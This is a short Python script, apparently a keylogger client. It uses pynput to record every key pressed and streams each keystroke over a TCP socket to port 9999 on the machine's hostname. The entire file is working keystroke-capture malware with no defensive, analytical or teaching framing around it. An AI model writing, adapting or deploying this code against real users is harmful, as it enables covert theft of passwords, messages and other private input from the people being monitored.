import socket
from pynput import keyboard


host = socket.gethostname()
ip = socket.gethostbyname(host)
port = 9999    
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

#Connecting to the server
client.connect((host, port))
print("Connected to " + ip)

while True:
    
    def KeyRecorder(key):

        #Sending the recorded keys
        data = str(key).encode()
        client.sendall(data)

    if __name__=='__main__':

        #Recording pressed keys
        listener = keyboard.Listener(on_press = KeyRecorder)
        listener.start()
        input()

    #Breaking the connection if an error occurs
    else:
        break

    

 




